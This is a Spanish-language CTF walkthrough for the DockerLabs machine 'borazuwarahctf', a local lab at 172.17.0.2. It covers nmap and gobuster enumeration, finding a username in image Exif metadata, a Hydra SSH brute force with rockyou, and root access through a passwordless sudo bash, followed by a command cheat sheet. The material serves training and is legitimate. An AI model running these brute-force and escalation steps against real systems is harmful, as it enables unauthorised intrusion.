# DockerLabs - borazuwarahctf

## Resumen
- **Dificultad:** Very Easy
- **Técnicas:** Enumeración de puertos, análisis de metadatos, SSH brute-forcing, escalada de privilegios vía sudo
- **Tiempo:** ~20 minutos
- **Fecha:** 2025-07-04

## Info
| | |
|---|---|
| IP | 172.17.0.2 |
| OS | Debian (Docker) |
| Servicios | 22/tcp (SSH), 80/tcp (HTTP) |

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sCV -p- 172.17.0.2 -oN targeted
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian 2+deb12u2 |
| 80/tcp | HTTP | Apache/2.4.59 (Debian) |

---

## Enumeración

### Gobuster

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt
```

Solo encontró `/index.html` — no hay más directorios.

### Análisis del sitio

Al abrir `http://172.17.0.2/` en el navegador, se muestra una imagen de un huevo kinder.

El archivo de imagen no existe en el servidor (devuelve 404), por lo que la imagen está embebida en el HTML. Pero al revisar la carpeta del lab, encontramos `imagen.jpeg`.

### Análisis de metadatos con ExifTool

```bash
exiftool imagen.jpeg
```

**Resultado clave:**
```
User: borazuwarah
```

La metadata Exif de la imagen revela el usuario: `borazuwarah`. La contraseña no aparece visible, por lo que we'll need to brute-force it.

---

## Explotación

### SSH Brute-forcing con Hydra

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -v
```

**Credenciales encontradas:**
- Usuario: `borazuwarah`
- Contraseña: `123456`

### Acceso SSH

```bash
ssh borazuwarah@172.17.0.2
password: 123456
```

¡Acceso logrado! Ahora somos usuario `borazuwarah`.

---

## Escalada de privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

**Resultado:**
```
User borazuwarah may run the following commands on f864c39c4cee:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

El usuario puede ejecutar `/bin/bash` como root SIN password.

### Obtención de shell root

```bash
sudo bash
whoami
# root
```

¡Somos root!

---

## Flag

No hay flags en esta máquina — el objetivo es simplemente obtener acceso root.

---

## Lecciones aprendidas

1. **Metadatos = oro**: Siempre revisar metadata de imágenes con `exiftool` o `strings`
2. **Credenciales por defecto**: Las máquinas de DockerLabs suelen tener contraseñas débiles
3. **sudo -l = clave**: En CTFs, siempre verificar qué puede ejecutar un usuario con sudo

---

## Comandos útiles

```bash
# Reconocimiento
ping -c 3 172.17.0.2
nmap -sCV -p- 172.17.0.2 -oN targeted

# Web enumeration
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt
exiftool imagen.jpeg

# Acceso inicial
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
ssh borazuwarah@172.17.0.2

# Escalada
sudo -l
sudo bash
```